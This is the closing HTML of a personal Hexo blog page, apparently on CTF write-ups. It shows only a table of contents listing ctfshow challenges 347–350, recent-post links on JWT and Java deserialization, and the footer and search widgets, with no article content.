class="toc-link" href="#ctfshow347"><span class="toc-number">1.2.3.</span> <span class="toc-text">ctfshow347</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow348"><span class="toc-number">1.2.4.</span> <span class="toc-text">ctfshow348</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow349"><span class="toc-number">1.2.5.</span> <span class="toc-text">ctfshow349</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow350"><span class="toc-number">1.2.6.</span> <span class="toc-text">ctfshow350</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/06/01/ctfshow/ctfshowJWT/" title="ctfshowJWT学习">ctfshowJWT学习</a><time datetime="2026-05-31T16:00:00.000Z" title="Created 2026-06-01 00:00:00">2026-06-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/java%E5%8F%8D%E5%B0%84/" title="java反射">java反射</a><time datetime="2026-05-28T16:00:00.000Z" title="Created 2026-05-29 00:00:00">2026-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/29/javapoc/javacc1/" title="java cc1">java cc1</a><time datetime="2026-05-28T16:00:00.000Z" title="Created 2026-05-29 00:00:00">2026-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="java反序列化基础">java反序列化基础</a><time datetime="2026-05-28T16:00:00.000Z" title="Created 2026-05-29 00:00:00">2026-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/03/hello-world/" title="Hello World">Hello World</a><time datetime="2026-05-03T06:11:20.426Z" title="Created 2026-05-03 14:11:20">2026-05-03</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By cuttlefish</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.0.0</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.4</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.4"></script><script src="/js/main.js?v=5.5.4"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading Database</span></div><div class="local-search-input"><input placeholder="输入关键字" type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.5.4"></script></div></div></body></html>
